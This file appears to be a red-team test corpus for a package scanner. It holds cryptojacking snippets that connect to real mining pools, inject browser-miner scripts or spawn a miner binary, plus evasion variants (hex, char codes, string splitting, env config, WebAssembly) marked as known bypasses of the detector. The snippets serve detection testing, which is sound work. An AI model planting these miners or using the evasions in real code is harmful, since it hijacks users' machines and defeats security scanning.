// red-team/corpus/crypto-miner-extended.js
// Extended crypto-miner variants (brands, algorithms, and signature-evasion forms).
// See crypto-miner.js for the entry schema.

module.exports = [
  // ── Additional real miners the signature list covers (expected BLOCK) ────────
  {
    id: 'miner-supportxmr',
    category: 'crypto-miner', technique: 'stratum-pool-url', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'SupportXMR pool over stratum+tcp',
    code: `module.exports.pool = 'stratum+tcp://pool.supportxmr.com:3333';`,
  },
  {
    id: 'miner-moneroocean',
    category: 'crypto-miner', technique: 'stratum-scheme', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'MoneroOcean pool via the stratum:// scheme',
    code: `const cfg = { url: 'stratum://gulf.moneroocean.stream:10128' }; module.exports = cfg;`,
  },
  {
    id: 'miner-cryptonight-heavy',
    category: 'crypto-miner', technique: 'mining-algorithm-ref', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'cryptonight-heavy algorithm selector',
    code: `module.exports.algo = 'cryptonight-heavy/xhv';`,
  },
  {
    id: 'miner-coinhive-hyphen',
    category: 'crypto-miner', technique: 'browser-miner-lib', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'coin-hive (hyphenated) in-browser miner reference',
    code: `const s = document.createElement('script'); s.src = 'https://coin-hive.com/lib/miner.min.js'; module.exports = s;`,
  },
  {
    id: 'miner-xmr-stak-rx',
    category: 'crypto-miner', technique: 'miner-binary-config', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'xmr-stak-rx miner binary launch',
    code: `require('child_process').spawn('./xmr-stak-rx', ['--noTest']);`,
  },
  {
    id: 'miner-nicehash-ethash',
    category: 'crypto-miner', technique: 'mining-marketplace-ref', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'nicehash ethash endpoint',
    code: `module.exports.url = 'stratum+tcp://daggerhashimoto.auto.nicehash.com:9200';`,
  },
  {
    id: 'miner-hashvault-alt-port',
    category: 'crypto-miner', technique: 'mining-pool-host', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'pool.hashvault reference on an alternate port',
    code: `module.exports = () => require('net').connect(80, 'pool.hashvault.pro');`,
  },
  {
    id: 'miner-randomx-stratum',
    category: 'crypto-miner', technique: 'stratum-pool-url', severity: 'CRITICAL',
    expected: 'BLOCK',
    description: 'RandomX miner over stratum+tcp',
    code: `const c = { algo: 'rx/0', url: 'stratum+tcp://rx.unmineable.com:3333' }; module.exports = c;`,
  },

  // ── Evasion / uncovered-brand variants (expected BLOCK, known bypass) ────────
  {
    id: 'miner-coinimp',
    category: 'crypto-miner', technique: 'uncovered-browser-miner', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'CoinIMP browser miner — brand not in the signature list, so it is not flagged',
    code: `const miner = new Client.Anonymous('coinimp-site-key', { throttle: 0.3 }); miner.start(); module.exports = miner;`,
  },
  {
    id: 'miner-jsecoin',
    category: 'crypto-miner', technique: 'uncovered-browser-miner', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'JSEcoin miner — not in the brand signature list',
    code: `const s = document.createElement('script'); s.src = 'https://load.jsecoin.com/load/'; document.body.appendChild(s); module.exports = {};`,
  },
  {
    id: 'miner-webminepool-ws',
    category: 'crypto-miner', technique: 'websocket-pool', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'WebSocket-proxied pool (webminepool) — no stratum+tcp/stratum:// literal',
    code: `const ws = new WebSocket('wss://ws.webminepool.com/'); ws.onopen = () => ws.send('{"type":"auth"}'); module.exports = ws;`,
  },
  {
    id: 'miner-deepminer',
    category: 'crypto-miner', technique: 'uncovered-browser-miner', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'deepMiner fork — brand not covered',
    code: `const m = new deepMiner.Anonymous('wallet.worker'); m.start(); module.exports = m;`,
  },
  {
    id: 'miner-hex-pool',
    category: 'crypto-miner', technique: 'hex-config-evasion', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'Pool URL held as a hex blob, decoded at runtime, never eval\'d',
    code: `const h = '73747261747576... '; const pool = Buffer.from(h.trim(), 'hex').toString(); module.exports = () => require('net').connect(pool);`,
  },
  {
    id: 'miner-env-pool',
    category: 'crypto-miner', technique: 'config-driven-pool', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'Pool URL supplied via env/config so no literal is present in source',
    code: `const pool = process.env.MINER_POOL; module.exports.start = () => require('net').createConnection(pool);`,
  },
  {
    id: 'miner-charcode-coinhive',
    category: 'crypto-miner', technique: 'charcode-evasion', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'Brand name reconstructed from char codes to dodge the literal',
    code: `const brand = String.fromCharCode(99,111,105,110,104,105,118,101); const url = 'https://' + brand + '.com/lib.js'; module.exports = url;`,
  },
  {
    id: 'miner-concat-cryptonight',
    category: 'crypto-miner', technique: 'string-concat-evasion', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'cryptonight algorithm string assembled from fragments',
    code: `const algo = 'crypto' + 'night'; module.exports = { hash: (b) => native.hash(b, algo) };`,
  },
  {
    id: 'miner-wasm',
    category: 'crypto-miner', technique: 'wasm-miner', severity: 'CRITICAL',
    expected: 'BLOCK', knownBypass: true,
    description: 'WebAssembly miner core — no textual mining signature at all',
    code: `WebAssembly.instantiateStreaming(fetch('/miner.wasm')).then((m) => m.instance.exports.mine()); module.exports = {};`,
  },
];
